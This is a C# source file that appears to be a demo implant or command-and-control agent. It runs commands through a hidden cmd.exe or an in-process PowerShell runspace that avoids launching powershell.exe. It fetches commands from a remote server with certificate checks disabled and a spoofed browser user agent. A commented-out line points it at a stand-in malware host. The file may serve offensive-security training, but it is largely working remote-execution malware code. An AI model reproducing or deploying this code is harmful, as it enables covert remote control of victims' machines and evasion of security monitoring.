using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;

namespace exposing_demo2
{
    class Program
    {
        //define dwell
        static int dwell = 500;  //0.5 seconds

        static void Main(string[] args)
        {
            while (true)
            {
                //Console.WriteLine(run(new string[] { GetCommand("https://www.malware.yes.local/order") }));
                Console.Write("> ");
                Console.WriteLine(run(new string[] { Console.ReadLine() }));

                System.Threading.Thread.Sleep(dwell);
            }
        }

        static string run(string[] args)
        {
            string output = String.Empty;

            if ((String.Join(" ", args).ToLower().Contains("powershell")))
            {
                //Use System.Management.Automation.dll instead of calling powershell.exe
                output = pRun(String.Join(" ", args));
            }
            else
            {
                Process p = new Process();
                string cmd = "cmd.exe";
                string args1 = "/C " + String.Join(" ", args);
                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(cmd, args1);

                procStartInfo.RedirectStandardError = true;
                procStartInfo.RedirectStandardOutput = true; // Set true to redirect the process stdout to the Process.StandardOutput StreamReader
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;          // Do not create the black window
                p.StartInfo = procStartInfo;
                p.Start();

                string stdout = p.StandardOutput.ReadToEnd();
                string stderr = p.StandardError.ReadToEnd();
                p.WaitForExit();

                output += stdout + "\n" + stderr;
            }
            return output;
        }

        public static string pRun(string cmd)
        {
            //powershell run class from Malware Dark Side Ops by @silentbreaksecurity

            Runspace r = RunspaceFactory.CreateRunspace();
            r.Open();
            RunspaceInvoke scriptInv = new RunspaceInvoke(r);
            Pipeline pipeline = r.CreatePipeline();

            pipeline.Commands.AddScript(cmd);

            pipeline.Commands.Add("Out-String");
            StringBuilder stringbuilder = new StringBuilder();

            try
            {
                Collection<PSObject> results = pipeline.Invoke();
                foreach (PSObject obj in results)
                {
                    stringbuilder.Append(obj);
                }
            }
            catch
            {
                stringbuilder.Append(string.Format("[!] Script Error\n {0}", pipeline.PipelineStateInfo.Reason));
            }
            r.Close();

            return stringbuilder.ToString().Trim();
        }

        static string GetCommand(string site)
        {
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            WebClient wc = new WebClient();
            wc.Headers.Add("User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko");
            return wc.DownloadString(site);
        }

    }
}
